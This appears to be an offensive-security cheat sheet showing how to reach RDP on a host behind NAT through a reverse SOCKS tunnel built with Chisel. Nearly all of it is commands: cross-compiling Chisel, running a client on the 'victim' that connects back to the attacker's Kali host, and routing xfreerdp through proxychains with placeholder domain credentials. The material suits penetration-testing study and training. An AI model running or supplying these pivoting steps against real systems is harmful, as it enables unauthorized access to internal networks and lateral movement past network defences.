# 08.07 Reverse RDP Proxy Chisel

> Section 9.1.3 · SOCKS tunnel over HTTP/SSH when RDP is behind NAT

## Overview

When the target is behind NAT, direct RDP is impossible. Chisel (Go-based, HTTP+SSH) creates a reverse SOCKS tunnel through an existing shell. Run chisel server on Kali, chisel client on victim, then proxychains rdesktop through the SOCKS proxy.

## Steps

- **Compile chisel** — Linux server and Windows client from same source.
- **Start server on Kali** — `./chisel server -p 8080 --socks5`.
- **Run client on victim** — `chisel.exe client <KALI_IP>:8080 socks`.
- **Configure proxychains** — add `socks5 127.0.0.1 1080` to /etc/proxychains.conf.
- **RDP through proxy** — `proxychains xfreerdp /v:<INTERNAL_IP> ...`.

## Commands

### Build chisel for Windows + Linux

```bash
# Install Go
apt install golang -y
git clone https://github.com/jpillora/chisel && cd chisel

# Linux server
go build -ldflags "-s -w" .

# Windows client (cross-compile)
env GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o chisel.exe .
```

### Chisel tunnel setup

```bash
# Kali — start server
./chisel server -p 8080 --socks5

# Victim (Windows) — connect back
chisel.exe client <KALI_IP>:8080 socks

# /etc/proxychains.conf
# socks5 127.0.0.1 1080

# Kali — RDP through tunnel
proxychains xfreerdp /v:<INTERNAL_IP> /u:<USER> /d:<DOMAIN> /p:<PASS> /cert:ignore
```
